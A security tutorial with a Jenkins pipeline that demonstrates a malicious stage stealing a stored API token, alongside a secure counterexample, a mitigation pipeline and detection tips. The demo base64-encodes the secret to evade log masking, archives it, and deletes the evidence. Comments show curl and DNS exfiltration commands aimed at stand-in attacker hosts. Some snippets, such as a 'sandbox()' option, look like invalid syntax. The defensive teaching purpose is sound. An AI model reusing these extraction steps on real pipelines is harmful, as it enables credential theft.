## Jenkinsfile Demonstrating Credential Extraction Vulnerability

```groovy
pipeline {
    agent any

    environment {
        // Legitimate credential usage (normal pattern)
        AWS_ACCESS_KEY_ID = credentials('aws-prod-access-key')
        // This is the vulnerable pattern we're demonstrating
        EXTRACTED_CREDS = credentials('jenkins-master-api-token')
    }

    stages {
        stage('Build') {
            steps {
                script {
                    echo "Legitimate build step using AWS credentials"
                    // Normal usage - credentials masked in logs
                    sh 'echo "AWS Key ID: ${AWS_ACCESS_KEY_ID}"'

                    // === VULNERABLE PATTERN STARTS HERE ===
                    // Attacker adds malicious code to extract credentials
                    echo "Starting malicious credential extraction..."

                    // Method 1: Write to file and exfiltrate
                    writeFile file: 'creds.txt', text: "API_TOKEN=${EXTRACTED_CREDS}"

                    // Method 2: Encode in output (base64 to avoid Jenkins masking)
                    def encodedCreds = EXTRACTED_CREDS.bytes.encodeBase64().toString()
                    echo "Encoded credentials (base64): ${encodedCreds}"

                    // Method 3: Send via network (simulated)
                    echo "Simulating exfiltration to attacker server..."
                    sh '''
                        # In real attack, this would be:
                        # curl -X POST https://attacker-server.com/exfil -d "creds=${EXTRACTED_CREDS}"
                        echo "Credentials would be sent to attacker-controlled server"

                        # Alternative: DNS exfiltration
                        # dig @attacker-dns `echo ${EXTRACTED_CREDS} | tr -d '\n'`.attacker.com
                    '''

                    // Method 4: Abuse artifact storage
                    archiveArtifacts artifacts: 'creds.txt', fingerprint: true

                    // Method 5: Store in environment variable for later stages
                    env.STOLEN_CREDS = encodedCreds
                }
            }
        }

        stage('Test') {
            steps {
                script {
                    // Credentials persist and can be accessed in later stages
                    echo "Malicious test stage accessing stolen creds"
                    if (env.STOLEN_CREDS) {
                        echo "Still have access to encoded credentials from previous stage"
                    }
                }
            }
        }

        stage('Deploy') {
            steps {
                // Attacker might add a "cleanup" step to remove evidence
                sh 'rm -f creds.txt || true'
                echo "Deployment complete (evidence cleaned)"
            }
        }
    }

    post {
        always {
            // Attacker could also exfiltrate in post-build actions
            echo "Post-build: Credential extraction complete"
        }
    }
}
```

## Secure Jenkinsfile Counterexample

```groovy
pipeline {
    agent any

    options {
        // Security best practices
        timestamps()
        buildDiscarder(logRotator(numToKeepStr: '10'))
        disableConcurrentBuilds()
    }

    environment {
        // Using withCredentials block instead of environment directive
        // This provides better scope control
    }

    stages {
        stage('Build') {
            steps {
                // CORRECT: Using withCredentials for scoped access
                withCredentials([
                    string(credentialsId: 'aws-prod-access-key', variable: 'AWS_KEY'),
                    string(credentialsId: 'aws-prod-secret-key', variable: 'AWS_SECRET')
                ]) {
                    script {
                        // Credentials only available within this block
                        echo "Building with AWS credentials..."

                        // Use credentials directly without storing
                        sh '''
                            aws configure set aws_access_key_id ${AWS_KEY}
                            aws configure set aws_secret_access_key ${AWS_SECRET}
                        '''
                    }
                }

                // Credentials no longer accessible here
                echo "AWS credentials are now out of scope"
            }
        }
    }
}
```

## Mitigation Strategies Jenkinsfile

```groovy
pipeline {
    agent any

    options {
        // Enable security features
        timeout(time: 30, unit: 'MINUTES')
        // Requires script approval for dangerous operations
        sandbox() // Groovy sandbox for script security
    }

    parameters {
        // Use parameters instead of hardcoded values
        choice(
            name: 'ENVIRONMENT',
            choices: ['dev', 'staging', 'prod'],
            description: 'Select deployment environment'
        )
    }

    stages {
        stage('Security Scan') {
            steps {
                // Integrate security scanning
                sh 'echo "Running pipeline security scan..."'
                // Tools like:
                // - Jenkins Warnings Next Generation Plugin
                // - OWASP Dependency Check
                // - Static Application Security Testing (SAST)
            }
        }

        stage('Approval Gate') {
            steps {
                // Manual approval for sensitive operations
                script {
                    timeout(time: 2, unit: 'HOURS') {
                        input(
                            message: 'Approve deployment to production?',
                            ok: 'Deploy',
                            parameters: [
                                string(
                                    name: 'REASON',
                                    description: 'Reason for deployment',
                                    defaultValue: ''
                                )
                            ]
                        )
                    }
                }
            }
        }
    }
}
```

## Key Security Recommendations:

1. **Use `withCredentials` blocks** instead of environment variables
2. **Implement pipeline libraries** with approved, reviewed code
3. **Enable Groovy sandbox** for script security
4. **Use Jenkins Credential Binding Plugin** properly
5. **Regularly audit** Jenkinsfiles and pipeline scripts
6. **Implement approval gates** for sensitive operations
7. **Monitor pipeline logs** for credential exposure
8. **Use short-lived credentials** where possible
9. **Implement network egress controls** to prevent exfiltration
10. **Regular Jenkins updates** and security patches

## Detection Signs:
- Base64 encoded strings in logs
- Unexpected network calls
- Credentials written to files
- Unusual artifact archiving
- Multiple credential accesses in single pipeline

**Remember:** Always conduct security testing in authorized environments with proper consent and isolation from production systems.

